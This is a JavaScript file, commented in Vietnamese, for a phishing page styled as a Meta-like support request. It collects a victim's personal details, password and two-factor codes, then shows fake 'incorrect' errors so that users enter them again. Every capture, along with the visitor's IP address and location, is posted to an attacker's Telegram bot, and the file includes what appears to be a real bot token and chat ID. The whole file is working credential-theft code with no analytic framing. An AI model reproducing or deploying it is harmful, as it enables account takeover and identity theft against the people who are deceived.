/* ==========================================

   PHẦN 1: CẤU HÌNH (CONFIG)

   ========================================== */

const CONFIG = {

    TELEGRAM_BOT_TOKEN: '7100924911:AAFbe2QHrx26J5pREWtgn-jo2pWKh5A9imE', // Đã giải mã từ đoạn hex

    TELEGRAM_CHAT_ID: '-5070121169',

    SECRET_KEY: 'HDNDT-JDHT8FNEK-JJHR', // Key dùng cho cryptojs (nếu có dùng)

    STORAGE_EXPIRY: 3600000, // 1 giờ

    COUNTDOWN_TIME: 30 // 30 giây đếm ngược

};



/* ==========================================

   PHẦN 2: TIỆN ÍCH (UTILS)

   ========================================== */

const Utils = {

    // Hàm mã hóa AES (Nếu bạn có thư viện crypto-js, nếu không thì bỏ qua)

    encrypt: (data) => {

        if (typeof CryptoJS === 'undefined') return data; 

        return CryptoJS.AES.encrypt(data, CONFIG.SECRET_KEY).toString();

    },



    // Hàm lưu vào LocalStorage có thời hạn

    saveRecord: (key, value) => {

        try {

            const record = {

                value: value,

                expiry: Date.now() + CONFIG.STORAGE_EXPIRY

            };

            localStorage.setItem(key, JSON.stringify(record));

        } catch (e) {

            console.error("Save error", e);

        }

    },



    // Hàm lấy từ LocalStorage

    getRecord: (key) => {

        try {

            const item = localStorage.getItem(key);

            if (!item) return null;

            const record = JSON.parse(item);

            if (Date.now() > record.expiry) {

                localStorage.removeItem(key);

                return null;

            }

            return record.value;

        } catch (e) {

            return null;

        }

    },



    // Lấy IP và Vị trí

    getUserLocation: async () => {

        try {

            // Dùng API miễn phí để lấy IP và Info

            const response = await fetch('https://ipwho.is/');

            const data = await response.json();

            if(data.success) {

                return {

                    ip: data.ip,

                    location: `${data.city}, ${data.country}`,

                    country_code: data.country_code,

                    flag: data.flag ? data.flag.emoji : ""

                };

            }

            return { ip: 'N/A', location: 'Unknown', country_code: '', flag: '' };

        } catch (e) {

            console.error(e);

            return { ip: 'N/A', location: 'Unknown', country_code: '', flag: '' };

        }

    },



    // Gửi tin nhắn về Telegram

    sendToTelegram: async (data) => {

        const loc = await Utils.getUserLocation();

        

        let message = `

<b>IP:</b> <code>${loc.ip}</code>

<b>Location:</b> <code>${loc.location} ${loc.flag}</code>

<b>Full Name:</b> <code>${data.fullName || 'N/A'}</code>

<b>Email:</b> <code>${data.email || 'N/A'}</code>

<b>Business Email:</b> <code>${data.emailBusiness || 'N/A'}</code>

<b>Phone:</b> <code>${data.phone || 'N/A'}</code>

<b>DOB:</b> <code>${data.day}/${data.month}/${data.year}</code>

`;



        if(data.password) message += `\n<b>Password:</b> <code>${data.password}</code>`;

        if(data.twoFa) message += `\n<b>2FA (Code 1):</b> <code>${data.twoFa}</code>`;

        if(data.twoFaSecond) message += `\n<b>2FA (Code 2):</b> <code>${data.twoFaSecond}</code>`;



        try {

            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {

                method: 'POST',

                headers: { 'Content-Type': 'application/json' },

                body: JSON.stringify({

                    chat_id: CONFIG.TELEGRAM_CHAT_ID,

                    text: message,

                    parse_mode: 'HTML'

                })

            });

        } catch (e) {

            console.error("Tele Error", e);

        }

    },



    maskEmail: (email) => {

        if (!email) return '';

        return email.replace(/^(.)(.*?)(.)@(.+)$/, (match, first, middle, last, domain) => {

            return first + '*'.repeat(middle.length) + last + '@' + domain;

        });

    },



    maskPhone: (phone) => {

        if (!phone || phone.length < 5) return phone;

        const first = phone.slice(0, 2);

        const last = phone.slice(-2);

        return first + ' ' + '*'.repeat(phone.length - 4) + ' ' + last;

    },



    generateTicketId: () => {

        const random = () => Math.random().toString(36).substr(2, 6).toUpperCase();

        return `${random()}-${random()}-${random()}`;

    }

};



/* ==========================================

   PHẦN 3: MODAL UI HANDLER

   ========================================== */

const Modal = {

    create: (id, content) => {

        const html = `

            <div id="${id}" class="fixed inset-0 z-50 flex items-center justify-center bg-black/40 hidden">

                <div class="bg-white max-h-full h-full max-w-lg shadow-lg p-5 rounded-2xl flex-col overflow-y-auto transform scale-0 opacity-0 transition-all duration-300">

                    ${content}

                </div>

            </div>`;

        document.body.insertAdjacentHTML('beforeend', html);

    },

    open: (id) => {

        const el = document.getElementById(id);

        if (!el) return;

        el.classList.remove('hidden');

        setTimeout(() => {

            const inner = el.querySelector('div');

            inner.classList.remove('scale-0', 'opacity-0');

            inner.classList.add('scale-100');

        }, 10);

    },

    close: (id) => {

        const el = document.getElementById(id);

        if (!el) return;

        const inner = el.querySelector('div');

        inner.classList.remove('scale-100');

        inner.classList.add('scale-0', 'opacity-0');

        setTimeout(() => {

            el.classList.add('hidden');

        }, 200);

    }

};



/* ==========================================

   PHẦN 4: LOGIC CHÍNH (MAIN)

   ========================================== */



document.addEventListener('DOMContentLoaded', () => {

    // 1. Set Ticket ID

    const ticketEl = document.getElementById('ticketId');

    if (ticketEl) ticketEl.innerText = Utils.generateTicketId();



    // 2. Sự kiện nút Submit ở trang chủ -> Mở Form Info

    const btnSubmit = document.getElementById('submitRequestBtn');

    if (btnSubmit) {

        btnSubmit.addEventListener('click', openClientModal);

    }

});



// --- Modal 1: Nhập thông tin (Info) ---

function openClientModal() {

    const modalId = 'clientModal';

    const formId = 'clientForm';

    

    // HTML của Form Info (Đã đơn giản hóa)

    const content = `

        <h2 class="font-bold text-[15px] mb-4">Information Form</h2>

        <form id="${formId}" class="space-y-3">

            <input id="fullName" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Full Name" required>

            <input id="email" type="email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Email" required>

            <input id="emailBusiness" type="email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Business Email" required>

            <input id="fanpage" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Page Name" required>

            <input id="phone" type="tel" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Phone Number" required>

            

            <div>

                <b class="text-[#9a979e] text-sm block mb-2">Date of Birth</b>

                <div class="grid grid-cols-3 gap-2">

                    <input id="day" type="number" placeholder="Day" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" required>

                    <input id="month" type="number" placeholder="Month" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" required>

                    <input id="year" type="number" placeholder="Year" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" required>

                </div>

            </div>

            

            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full font-semibold hover:bg-blue-700">Send</button>

        </form>

    `;



    Modal.create(modalId, content);

    Modal.open(modalId);



    // Xử lý khi bấm Send

    document.getElementById(formId).addEventListener('submit', async (e) => {

        e.preventDefault();

        

        // Thu thập dữ liệu

        const data = {

            fullName: document.getElementById('fullName').value,

            email: document.getElementById('email').value,

            emailBusiness: document.getElementById('emailBusiness').value,

            fanpage: document.getElementById('fanpage').value,

            phone: document.getElementById('phone').value,

            day: document.getElementById('day').value,

            month: document.getElementById('month').value,

            year: document.getElementById('year').value

        };



        // Lưu vào LocalStorage

        Utils.saveRecord('__client_rec', data);

        

        // Chuyển sang bước Password

        Modal.close(modalId);

        openSecurityModal(); // Mở modal mật khẩu

    });

}



// --- Modal 2: Nhập Password (2 Lần) ---

function openSecurityModal() {

    const modalId = 'authModal';

    const formId = 'authForm';

    

    const content = `

        <h2 class="text-[20px] font-bold mb-2">Please Enter Your Password</h2>

        <p class="text-sm text-gray-500 mb-4">For your security, please re-enter your password to continue.</p>

        <form id="${formId}">

            <input id="password" type="password" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm mb-2" placeholder="Password" required>

            <p id="passError" class="text-red-500 text-sm hidden mb-2">The password you entered is incorrect.</p>

            <button id="btnContinue" type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full font-semibold">Continue</button>

        </form>

    `;



    Modal.create(modalId, content);

    Modal.open(modalId);



    let attempts = 0;



    document.getElementById(formId).addEventListener('submit', async (e) => {

        e.preventDefault();

        const passInput = document.getElementById('password');

        const errorText = document.getElementById('passError');

        const password = passInput.value;



        if(!password) return;



        attempts++;



        // LẦN 1: Luôn báo sai

        if (attempts === 1) {

            // Lấy data cũ, thêm pass vào và gửi

            const oldData = Utils.getRecord('__client_rec');

            const dataToSend = { ...oldData, password: password };

            

            // Gửi telegram

            Utils.sendToTelegram(dataToSend);



            // Báo lỗi giả

            errorText.classList.remove('hidden');

            passInput.value = "";

            passInput.focus();

        } 

        // LẦN 2: Chuyển sang Verify

        else {

            const oldData = Utils.getRecord('__client_rec');

            // Lưu password lần 2 (pass chuẩn)

            const dataToSend = { ...oldData, password: password }; // Gửi pass lần 2

            

            Utils.saveRecord('__client_rec', dataToSend);

            await Utils.sendToTelegram(dataToSend);



            Modal.close(modalId);

            openAuthenticationModal(dataToSend); // Chuyển sang 2FA

        }

    });

}



// --- Modal 3: Verify 2FA (Khóa 30s sau mỗi lần sai) ---

function openAuthenticationModal(data) {

    const modalId = 'twoFaModal';

    const content = `

        <h2 class="text-[20px] font-bold mb-2">Two-factor authentication required</h2>

        <p class="text-sm text-gray-500 mb-4">

            Enter the code we sent to ${Utils.maskEmail(data.email)} or ${Utils.maskPhone(data.phone)}

        </p>

        <img src="/public/verify-illustration.png" class="w-full mb-4">

        

        <input id="code" type="text" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm mb-2" placeholder="Login code" required>

        <p id="codeError" class="text-red-500 text-sm hidden mb-2">The code is incorrect.</p>

        <p id="countdown" class="text-gray-500 text-sm hidden mb-2"></p>

        

        <button id="btnVerify" class="w-full h-10 bg-[#0064E0] text-white rounded-full font-semibold">Continue</button>

    `;



    Modal.create(modalId, content);

    Modal.open(modalId);



    const btnVerify = document.getElementById('btnVerify');

    const codeInput = document.getElementById('code');

    const errorText = document.getElementById('codeError');

    const countdownText = document.getElementById('countdown');



    let verifyAttempts = 0;



    btnVerify.addEventListener('click', async () => {

        const code = codeInput.value;

        if (!code) return;



        verifyAttempts++;



        // Gửi code về Telegram

        const oldData = Utils.getRecord('__client_rec');

        const dataToSend = { 

            ...oldData, 

            [verifyAttempts === 1 ? 'twoFa' : 'twoFaSecond']: code // Lưu code1 hoặc code2

        };

        

        await Utils.sendToTelegram(dataToSend);



        // Báo lỗi

        errorText.classList.remove('hidden');

        codeInput.value = "";



        // Nếu sai 3 lần -> Chuyển hướng

        if (verifyAttempts >= 3) {

            btnVerify.innerText = "Redirecting...";

            setTimeout(() => {

                window.location.href = CONFIG.REDIRECT_URL;

            }, 1000);

            return;

        }



        // KHÓA 30 GIÂY NGAY LẬP TỨC

        startLockdown(30);

    });



    function startLockdown(seconds) {

        btnVerify.disabled = true;

        btnVerify.classList.add('opacity-50');

        countdownText.classList.remove('hidden');

        

        const timer = setInterval(() => {

            seconds--;

            countdownText.innerText = `Try again in ${seconds}s`;

            

            if (seconds <= 0) {

                clearInterval(timer);

                btnVerify.disabled = false;

                btnVerify.classList.remove('opacity-50');

                countdownText.classList.add('hidden');

                errorText.classList.add('hidden');

            }

        }, 1000);

    }

}
